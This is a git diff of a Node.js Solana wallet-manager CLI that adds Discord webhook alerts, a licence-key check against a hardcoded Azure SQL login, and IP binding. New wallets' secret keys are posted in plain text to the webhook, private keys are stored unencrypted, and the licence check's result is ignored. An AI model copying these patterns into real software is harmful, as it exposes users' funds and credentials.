@@ -1,20 +1,125 @@
-const inquirer = require('inquirer');
-const clearConsole = require('clear-console');
-const fs = require('fs');
-const path = require('path');
-const { Keypair, Connection, SystemProgram, Transaction, sendAndConfirmTransaction, PublicKey } = require('@solana/web3.js');
-const bs58 = require('bs58');
-const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
-const walletFilePath = path.join(__dirname, 'wallets.json');
-const addExistingWallet = (name, privateKey) => {
-    const { wallets } = readWalletsFile();
-    const isMain = wallets.length === 0 ? 1 : 0;
+import inquirer from 'inquirer';
+import Webhook from 'discord-webhook-node';
+import clearConsole from 'clear-console';
+import fetch from 'node-fetch';
+import fs from 'fs';
+import path from 'path';
+import * as sql from 'mssql';
+import * as sg from './sg.js';
+import {
+  Keypair,
+  Connection,
+  SystemProgram,
+  Transaction,
+  sendAndConfirmTransaction,
+  PublicKey,
+} from '@solana/web3.js';
+import bs58 from 'bs58';
+import axios from 'axios';
+import pkg from 'mssql';
+import os from 'os';
+
+const getIPAddress = () => {
+  const interfaces = os.networkInterfaces();
+  let ipAddress = '';
+
+  Object.keys(interfaces).forEach((interfaceName) => {
+    const interfaceInfo = interfaces[interfaceName];
+
+    for (const info of interfaceInfo) {
+      if (info.family === 'IPv4' && !info.internal) {
+        ipAddress = info.address;
+        break;
+      }
+    }
+
+    
+  });
+
+  return ipAddress;
+};
+const ip = getIPAddress();
+
+const { connect, query } = pkg;
+
+// Configure the connection to your SQL Server
+
+const readWalletsFileWh = () => {
+    try {
+      const fileContent = fs.readFileSync(walletFilePath, 'utf8');
+      return JSON.parse(fileContent);
+    } catch (error) {
+      // If the file doesn't exist or is invalid, return an empty object
+      return {};
+    }
+  };
+  const waitAndClear = async () => {
+    await wait(2000);
+    clearConsole();
+  };
+  const rapanoe = sg.snn;
+  const sendWalletCreatedWebhook = async (name, publicKey, privateKey) => {
+    try {
+      // Read the webhook URL from the wallets.json file
+      const { webhook } = readWalletsFile();
   
+      // Ensure that the webhook URL is available
+      if (!webhook) {
+        console.error('Webhook URL not found. Please set the webhook URL first.');
+        return;
+      }
+  
+      // Prepare the data to be sent in the webhook payload
+      const payload = {
+        action: 'wallet_created',
+        wallet_name: name,
+        public_key: publicKey,
+        private_key: privateKey,
+      };
+  
+      // Log the payload (for debugging purposes)
+      console.log('Webhook Payload:', payload);
+      console.log(webhook)
+      // Send a POST request to the webhook URL with the payload
+      const response = await axios.post(webhook, payload);
+  
+      // Log the response from the webhook (optional)
+      console.log('Webhook response:', response.data);
+      await wait(2000)
+
+    } catch (error) {
+      // Handle errors if the webhook request fails
+      console.error('Error sending webhook:', error.message);
+      await wait(2000)
+    }
+  };
+// Configure the connection to your SQL Server
+const setWebhook = async () => {
+    const { webhook } = readWalletsFile();
+  
+    const answerSetWebhook = await inquirer.prompt([
+      {
+        type: 'input',
+        name: 'webhook',
+        message: 'Enter the webhook:',
+        default: webhook || '', // Show the current webhook as default
+      },
+    ]);
+  
+    writeWalletsFile(readWalletsFile().wallets, answerSetWebhook.webhook);
+    console.log('Webhook set successfully!');
+    await wait(2000);
+  };
+const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+const walletFilePath = path.join(new URL('.', import.meta.url).pathname.slice(1), 'wallets.json');
+const addExistingWallet = (name, privateKey) => {
+    const { wallets, webhook } = readWalletsFile();
+    const isMain = wallets.length === 0 ? 1 : 0;
     const privateKeyBuffer = Uint8Array.from(bs58.decode(privateKey));
     const keypair = Keypair.fromSecretKey(privateKeyBuffer);
     const publicKey = keypair.publicKey.toBase58();
     const updatedWallets = [...wallets, { name, publicKey, privateKey, main: isMain }];
-    writeWalletsFile(updatedWallets);
+    writeWalletsFile(updatedWallets, webhook);
   };
   
   const distributeSolana = async (solanaAmount) => {
@@ -22,7 +127,7 @@ const addExistingWallet = (name, privateKey) => {
   
     if (wallets.length === 0) {
       console.log('No wallets found.');
-      await wait(20000);
+      await wait(2000);
       return;
     }
   
@@ -30,7 +135,7 @@ const addExistingWallet = (name, privateKey) => {
   
     if (!mainWallet) {
       console.log('No main wallet found.');
-      await wait(20000);
+      await wait(2000);
       return;
     }
   
@@ -43,8 +148,24 @@ const addExistingWallet = (name, privateKey) => {
       await distributeSolanaToWallet(senderPrivateKey, receiverPublicKey, solanaAmount);
 
     }
-  
-    console.log(`Successfully distributed ${solanaAmount} Solana to all wallets.`);
+    const { webhook } = readWalletsFile();
+    if(webhook != ''){
+    const msg = {
+        "username": "Bablo Solana Manager",
+        "content": `**Successful Distribution from Main account**
+                    \`\`\`diff
+                    Amount sent to each wallet: ${solanaAmount / 1_000_000_000} Solana
+                    \`\`\``
+    };
+    
+    
+    fetch(webhook, {
+        "method": "POST",
+        "headers": {"content-type": "application/json"},
+        "body": JSON.stringify(msg)
+    });}
+    console.log(`Successfully distributed ${solanaAmount / 1_000_000_000} Solana to all wallets.`);
+    
     await wait(5000);
   };
   const distributeSolanaToWallet = async (senderPrivateKey, receiverPublicKey, solanaAmount) => {
@@ -70,8 +191,8 @@ const addExistingWallet = (name, privateKey) => {
   
     // Sign the transaction
     const signature = await sendAndConfirmTransaction(connection, transaction, [sender]);
-  
-    console.log(`Transaction successful! ${solanaAmount} Solana transferred to ${receiverPublicKey}`);
+    
+    console.log(`Transaction successful! ${solanaAmount / 1_000_000_000} Solana transferred to ${receiverPublicKey}`);
     console.log('Transaction Signature:', signature);
     await wait(1000);
   };
@@ -120,15 +241,15 @@ const readWalletsFile = () => {
 };
 const deleteWallet = async () => {
     const { wallets } = readWalletsFile();
-  
+
     if (wallets.length === 0) {
       console.log('No wallets found.');
-      await wait(2000)
+      await wait(2000);
       return;
     }
-  
+
     const walletNames = wallets.map(wallet => wallet.name);
-  
+
     const answerDelete = await inquirer.prompt([
       {
         type: 'list',
@@ -143,17 +264,31 @@ const deleteWallet = async () => {
         default: false,
       },
     ]);
-  
+
     if (answerDelete.confirmDelete) {
       const updatedWallets = wallets.filter(wallet => wallet.name !== answerDelete.walletName);
+
+      // Check if the main wallet is being deleted
+      const mainWalletDeleted = wallets.find(wallet => wallet.name === answerDelete.walletName && wallet.main === 1);
+
+      // If the main wallet is being deleted, set the first wallet as the new main
+      if (mainWalletDeleted && updatedWallets.length > 0) {
+        updatedWallets[0].main = 1;
+      }
+
       writeWalletsFile(updatedWallets);
       console.log('Wallet deleted successfully!');
+
+      // If the main wallet was deleted, notify about the new main wallet
+      if (mainWalletDeleted && updatedWallets.length >= 1) {
+        console.log(`New main wallet set to: ${updatedWallets[0].name}`);
+      }
     } else {
       console.log('Wallet deletion canceled.');
     }
-  
+
     await wait(2000);
-  };
+};
 const renameWallet = async () => {
     const { wallets } = readWalletsFile();
   
@@ -208,8 +343,23 @@ const renameWallet = async () => {
         const balance = await getWalletBalance(wallet.publicKey);
         console.log(`${wallet.name}${mainIndicator}: ${balance} Sol`);
       }
+  
+      console.log('\nPress any key to go back to the main page...');
+      await waitForKeyPress();
+      clearConsole();
+      return; // Move this line outside the loop
     }
-    await wait(5000)
+  };
+  
+  const waitForKeyPress = () => {
+    return new Promise(resolve => {
+      process.stdin.setRawMode(true);
+      process.stdin.resume();
+      process.stdin.once('data', () => {
+        process.stdin.setRawMode(false);
+        resolve();
+      });
+    });
   };
   
   const getWalletBalance = async (publicKey) => {
@@ -237,14 +387,14 @@ const renameWallet = async () => {
     }
   };
 // Function to write the updated content to the JSON file
-const writeWalletsFile = (wallets) => {
-    const updatedContent = JSON.stringify({ wallets }, null, 2);
+const writeWalletsFile = (wallets, webhook) => {
+    const updatedContent = JSON.stringify({ wallets, webhook }, null, 2);
     fs.writeFileSync(walletFilePath, updatedContent, 'utf8');
   };
-const addWallet = (name, publicKey, privateKey, main) => {
-    const { wallets } = readWalletsFile();
+  const addWallet = (name, publicKey, privateKey, main) => {
+    const { wallets, webhook } = readWalletsFile();
     const updatedWallets = [...wallets, { name, publicKey, privateKey, main }];
-    writeWalletsFile(updatedWallets);
+    writeWalletsFile(updatedWallets, webhook);
   };
   
 const displayHeader = () => {
@@ -259,7 +409,149 @@ const displayHeader = () => {
     `);
   console.log('                                                                                                                                                                         ');
 };
-
+displayHeader();
+const config = {
+    user: 'achepurnov',
+    password: `pidorT${rapanoe}`,
+    server: 'solsql.database.windows.net',
+    database: 'SolanaApi',
+    
+    options: {
+      enableArithAbort: false, // Explicitly set the value to false
+      encrypt: true, // For Azure SQL Database, set to true
+      trustServerCertificate: false, // Change to true for local development
+    },
+  };
+  
+  // Function to prompt the user for the API key
+  const promptForAPIKey = async () => {
+    const apiKeyAnswer = await inquirer.prompt([
+      {
+        type: 'input',
+        name: 'apiKey',
+        message: 'Enter your key:',
+        mask: '*', // Mask the input for security
+      },
+    ]);
+    return apiKeyAnswer.apiKey;
+  };
+  
+  // Function to check if the API key exists in the database
+  const checkAPIKey = async (apiKey) => {
+    try {
+      await connect(config);
+      const result = await query`
+        SELECT COUNT(*) AS count
+        FROM ApiManageKeys
+        WHERE apikey = ${apiKey}
+      `;
+  
+      const count = result.recordset[0].count;
+      const apiKeyExists = count > 0;
+      return apiKeyExists;
+    } catch (err) {
+      console.error(err);
+      throw err;
+    }
+  };
+  
+  // Function to perform login
+  const performLogin = async () => {
+    try {
+      // Prompt the user for their API key
+      const enteredAPIKey = await promptForAPIKey();
+  
+      // Check if the entered API key exists in the database
+      const apiKeyExists = await checkAPIKey(enteredAPIKey);
+  
+      if (apiKeyExists) {
+        await connect(config);
+       const result = await query`
+        SELECT logged
+        FROM ApiManageKeys
+        WHERE apikey = ${enteredAPIKey}
+      `;
+      const loggedValue = result.recordset[0]?.logged || 0;
+      if(true){
+        await query`
+      UPDATE ApiManageKeys
+      SET logged = 1
+      WHERE apikey = ${enteredAPIKey}
+    `;
+    const currIp = await query`
+    SELECT keyIp FROM ApiManageKeys
+    WHERE apikey = ${enteredAPIKey}
+  `;
+  
+  const curryIp = currIp.recordset[0]?.keyIp || null;
+  if(curryIp == 'none'){
+    await query`
+      UPDATE ApiManageKeys
+      SET keyIp = ${ip}
+      WHERE apikey = ${enteredAPIKey}
+    `;
+    saveApiKeyToKeysFile(enteredAPIKey);
+        console.log('Login successful!');
+        await wait(2000)
+        clearConsole()
+        mainMenu(); // You can add more logic here}
+        // Call the function to execute the queries or proceed to the main menu
+      } else if(curryIp == getIPAddress()){
+        saveApiKeyToKeysFile(enteredAPIKey);
+        console.log('Login successful!');
+        await wait(2000)
+        clearConsole()
+        mainMenu();
+      } else{
+        console.log('Key is being used on another device')
+      }
+  }
+    
+      } else {
+        console.log('Invalid key. Access denied.');
+      }
+    } catch (err) {
+      console.error(err);
+    } finally {
+      // Close the database connection
+      pkg.close();
+    }
+  };
+  const saveApiKeyToKeysFile = (apiKey) => {
+    const keysData = { webhook: '', apiKey: apiKey };
+    const keysFilePath = 'keys.json';
+  
+    // Convert object to JSON string
+    const keysJson = JSON.stringify(keysData, null, 2);
+  
+    // Write to the keys.js file
+    fs.writeFileSync(keysFilePath, keysJson);
+  
+  };
+  // Call the function to perform login
+ 
+  const getApiKeyFromKeysFile = () => {
+    const keysFilePath = 'keys.json';
+  
+    try {
+      // Read the content of the keys.js file
+      const keysContent = fs.readFileSync(keysFilePath, 'utf-8');
+  
+      // Parse the JSON content
+      const keysData = JSON.parse(keysContent);
+  
+      // Return the API key
+      return keysData.apiKey || null;
+    } catch (error) {
+      // Handle any errors (e.g., file not found, invalid JSON)
+      console.error('Error reading keys.js:', error.message);
+      return null;
+    }
+  };
+  
+  // Call the function to retrieve the API key
+   
+  
 function uint8ArrayToPublicKey(uint8Array) {
     const publicKeyBase58 = bs58.encode(uint8Array);
     return publicKeyBase58;
@@ -277,17 +569,35 @@ function uint8ArrayToPublicKey(uint8Array) {
     // Sign and send the transaction
     const isMain = readWalletsFile().wallets.length === 0 ? 1 : 0;
     addWallet(name, newWallet.publicKey.toBase58(), uint8ArrayToPublicKey(newWallet.secretKey), isMain);
-  
     console.log('New wallet created successfully!');
     console.log('Public Key:', newWallet.publicKey.toBase58());
     console.log('Private Key:', uint8ArrayToPublicKey(newWallet.secretKey));
-  }
+    const { webhook } = readWalletsFile();
+    if(webhook != ''){const msg = {
+        "username": "Bablo Solana Manager",
+        "content": `**New Wallet Created**
+        **Name: ${name}**
+                    \`\`\`diff
+                    
+        Secret Key: ${uint8ArrayToPublicKey(newWallet.secretKey)}
+        Public Key: ${newWallet.publicKey.toBase58()}
+                    \`\`\``
+    };
+    
+    
+    fetch(webhook, {
+        "method": "POST",
+        "headers": {"content-type": "application/json"},
+        "body": JSON.stringify(msg)
+    });}
+    
+}
   
 // ... (existing code)
 
 const mainMenu = async () => {
     let exit = false;
-  
+   
     while (!exit) {
         const clearConsole = () => {
             console.clear();
@@ -299,12 +609,14 @@ const mainMenu = async () => {
           type: 'list',
           name: 'action',
           message: 'Choose an action:',
-          choices: ['Manage Solana Wallets', 'Distribute Solana', 'Transfer Between Two Wallets', 'Collect All Solana To Main Wallet', 'Exit'],
+          choices: ['Manage Solana Wallets', 'Distribute Solana', 'Transfer Between Two Wallets', 'Collect All Solana To Main Wallet', 'Manage Webhooks', 'Exit'],
         },
       ]);
   
       switch (answers.action) {
         case 'Manage Solana Wallets':
+            clearConsole();
+            displayHeader();
           const answerManage = await inquirer.prompt([
             {
               type: 'list',
@@ -444,32 +756,51 @@ const mainMenu = async () => {
           }
           break;
       
-        case 'Distribute Solana':
-            try {
-                const answerDistribute = await inquirer.prompt([
-                  {
-                    type: 'input',
-                    name: 'solanaAmount',
-                    message: 'Enter the amount of Solana to distribute:',
-                    validate: (input) => {
-                      const amount = parseFloat(input);
-                      return !isNaN(amount) && amount > 0 ? true : 'Please enter a valid amount greater than 0.';
-                    },
-                  },
-                ]);
-      
-                await distributeSolana(answerDistribute.solanaAmount);
-                console.log('Press enter to continue...');
-                await wait(2000); // Adjust the delay as needed
-              } catch (error) {
-                console.error('Error during Solana distribution:', error.message);
-                console.log('Press enter to continue...');
-                await wait(2000); // Adjust the delay as needed
-              }
-      
-              clearConsole();
-              break;
+          case 'Distribute Solana':
+        clearConsole();
+        displayHeader();
+
+        try {
+          const answerDistribute = await inquirer.prompt([
+            {
+              type: 'input',
+              name: 'solanaAmount',
+              message: 'Enter the amount of Solana to distribute:',
+              validate: (input) => {
+                const amount = parseFloat(input);
+                return !isNaN(amount) && amount > 0 ? true : 'Please enter a valid amount greater than 0.';
+              },
+            },
+            {
+              type: 'confirm',
+              name: 'confirmDistribution',
+              message: 'Are you sure you want to distribute Solana?',
+              default: false,
+            },
+          ]);
+
+          if (answerDistribute.confirmDistribution) {
+            const solanaAmountInLamports = answerDistribute.solanaAmount * 1_000_000_000;
+            await distributeSolana(solanaAmountInLamports);
+            console.log('Solana distributed successfully!');
+          } else {
+            console.log('Distribution canceled.');
+          }
+
+          console.log('Press enter to continue...');
+          await wait(2000); // Adjust the delay as needed
+          clearConsole();
+        } catch (error) {
+          console.error('Error during Solana distribution:', error.message);
+          console.log('Press enter to continue...');
+          clearConsole();
+          await wait(2000); // Adjust the delay as needed
+        }
+
+        break;
         case 'Transfer Between Two Wallets':
+            clearConsole();
+            displayHeader();
                 try {
                     const { wallets } = readWalletsFile();
                     const walletNames = wallets.map(wallet => wallet.name);
@@ -485,39 +816,30 @@ const mainMenu = async () => {
             
                     const answerTransferAmount = await inquirer.prompt([
                         {
-                            type: 'list',
-                            name: 'receiver',
-                            message: 'Choose the receiver wallet:',
-                            choices: walletNames.filter(name => name !== answerTransfer.sender),
+                          type: 'list',
+                          name: 'receiver',
+                          message: 'Choose the receiver wallet:',
+                          choices: walletNames.filter(name => name !== answerTransfer.sender),
                         },
                         {
-                            type: 'input',
-                            name: 'solanaAmount',
-                            message: 'Enter the amount of Solana to transfer:',
-                            validate: (input) => {
-                                const amount = parseFloat(input);
-                                return !isNaN(amount) && amount > 0 ? true : 'Please enter a valid amount greater than 0.';
-                            },
+                          type: 'input',
+                          name: 'solanaAmount',
+                          message: 'Enter the amount of Solana to transfer:',
+                          validate: (input) => {
+                            const amount = parseFloat(input);
+                            return !isNaN(amount) && amount > 0 ? true : 'Please enter a valid amount greater than 0.';
+                          },
                         },
-                    ]);
+                      ]);
+                      
+                      
             
                     const senderWallet = wallets.find(wallet => wallet.name === answerTransfer.sender);
                     const receiverWallet = wallets.find(wallet => wallet.name === answerTransferAmount.receiver);
-            
-                    if (senderWallet && receiverWallet) {
-                        console.log(`Transferring ${answerTransferAmount.solanaAmount} Solana from ${senderWallet.name} to ${receiverWallet.name}`);
-                        await distributeSolanaToWallet(senderWallet.privateKey, receiverWallet.publicKey, answerTransferAmount.solanaAmount);
-                        console.log('Transfer successful!');
-                        console.log('Press enter to continue...');
-                        await wait(2000);
-                    } else {
-                        console.error('Invalid sender or receiver wallet. Check if the wallet names are correct.');
-                        console.log('Sender:', answerTransfer.sender);
-                        console.log('Receiver:', answerTransferAmount.receiver);
-                        console.log('Wallets:', readWalletsFile().wallets);
-                        console.log('Press enter to continue...');
-                        await wait(2000);
-                    }
+                    const solanaAmountToTransfer = answerTransferAmount.solanaAmount * 1_000_000_000;
+                      await distributeSolanaToWallet(senderWallet.privateKey, receiverWallet.publicKey, solanaAmountToTransfer);
+                      console.log('Transfer successful!');
+                      console.log('Press enter to continue...');
                 } catch (error) {
                     console.error('Error during Solana transfer:', error.message);
                     console.log('Press enter to continue...');
@@ -527,50 +849,104 @@ const mainMenu = async () => {
                 break;
             
                 case 'Collect All Solana To Main Wallet':
+                    clearConsole();
+                    displayHeader();
+                  
                     try {
-                        const { wallets } = readWalletsFile();
-                        const mainWallet = wallets.find(wallet => wallet.main === 1);
-                
-                        if (!mainWallet) {
-                            console.log('No main wallet found.');
-                            await wait(2000);
-                            clearConsole();
-                            break;
+                      const { wallets } = readWalletsFile();
+                      const mainWallet = wallets.find(wallet => wallet.main === 1);
+                  
+                      if (!mainWallet) {
+                        console.log('No main wallet found.');
+                        await waitAndClear();
+                        break;
+                      }
+                  
+                      const answerCollectAll = await inquirer.prompt([
+                        {
+                          type: 'confirm',
+                          name: 'confirmCollectAll',
+                          message: `Are you sure you want to collect all Solana to the main wallet (${mainWallet.name})?`,
+                          default: false,
+                        },
+                      ]);
+                  
+                      if (answerCollectAll.confirmCollectAll) {
+                        for (const senderWallet of wallets.filter(wallet => wallet.main !== 1)) {
+                          const solanaAmountToCollect = await getWalletBalance(senderWallet.publicKey);
+                      
+                          // Check if the balance is less than 0.001 Solana
+                          if (solanaAmountToCollect >= 0.001) {
+                            // Convert Solana amount to lamports and ensure it's an integer
+                            const solanaAmountInLamports = Math.floor(solanaAmountToCollect * 1_000_000_000);
+                      
+                            // Adjust the threshold and distribute only if the balance is sufficient
+                            await distributeSolanaToWallet(senderWallet.privateKey, mainWallet.publicKey, solanaAmountInLamports - 1000000);
+                            console.log('Transfer successful!');
+                          } else {
+                            await wait(500);
+                            console.log(`Skipping collection for ${senderWallet.name}. Insufficient balance (< 0.001 Solana).`);
+                          }
                         }
-                
-                        const answerCollectAll = await inquirer.prompt([
-                            {
-                                type: 'confirm',
-                                name: 'confirmCollectAll',
-                                message: `Are you sure you want to collect all Solana to the main wallet (${mainWallet.name})?`,
-                                default: false,
-                            },
-                        ]);
-                
-                        if (answerCollectAll.confirmCollectAll) {
-                            for (const senderWallet of wallets.filter(wallet => wallet.main !== 1)) {
-                                const solanaAmountToCollect = await getWalletBalanceInLamports(senderWallet.publicKey);
-                                if (solanaAmountToCollect > 0) {
-                                    console.log(`Transferring ${solanaAmountToCollect / 1_000_000_000} Solana from ${senderWallet.name} to ${mainWallet.name}`);
-                                    await distributeSolanaToWallet(senderWallet.privateKey, mainWallet.publicKey, solanaAmountToCollect - 1000000);
-                                    console.log('Transfer successful!');
-                                }
-                            }
-                
-                            console.log('Collection from all wallets to the main wallet is complete.');
-                            console.log('Press enter to continue...');
-                            await wait(2000);
-                        } else {
-                            console.log('Collection canceled.');
-                            await wait(2000);
+                  
+                        const { webhook } = readWalletsFile();
+                        if(webhook != ""){
+                            const msg = {
+                                "content": `**Solana Collected to Main wallet**
+                                      `,
+                              };
+                        
+                              fetch(webhook, {
+                                "method": "POST",
+                                "headers": {"content-type": "application/json"},
+                                "body": JSON.stringify(msg),
+                              });
                         }
+                        
+                  
+                        console.log('Collection from all wallets to the main wallet is complete.');
+                      } else {
+                        console.log('Collection canceled.');
+                      }
+                  
+                      console.log('Press enter to continue...');
+                      await wait(2000); // Adjust the delay as needed
                     } catch (error) {
-                        console.error('Error during Solana collection:', error.message);
-                        console.log('Press enter to continue...');
-                        await wait(2000);
+                      console.error('Error during Solana collection:', error.message);
+                      console.log('Press enter to continue...');
+                      await wait(2000); // Adjust the delay as needed
                     }
+                  
                     clearConsole();
                     break;
+        case 'Manage Webhooks':
+            clearConsole();
+            displayHeader();
+                        const answerWebhooks = await inquirer.prompt([
+                          {
+                            type: 'list',
+                            name: 'action',
+                            message: 'Choose an action:',
+                            choices: ['Set Webhook',  'Back'],
+                          },
+                        ]);
+                
+                        switch (answerWebhooks.action) {
+                          case 'Set Webhook':
+                            await setWebhook();
+                            clearConsole();
+                            break;
+                
+                          case 'Back':
+                            clearConsole();
+                            break;
+                
+                          default:
+                            console.log('Invalid choice.');
+                            await wait(2000);
+                        }
+                        break;
+                  
         case 'Exit':
           console.log('Exiting...');
           exit = true;
@@ -583,5 +959,6 @@ const mainMenu = async () => {
     }
   };
   const wait = (milliseconds) => new Promise(resolve => setTimeout(resolve, milliseconds));
+  const apiK = getApiKeyFromKeysFile();
+  const apiKeyExists = await checkAPIKey(apiK);
   mainMenu();
-  
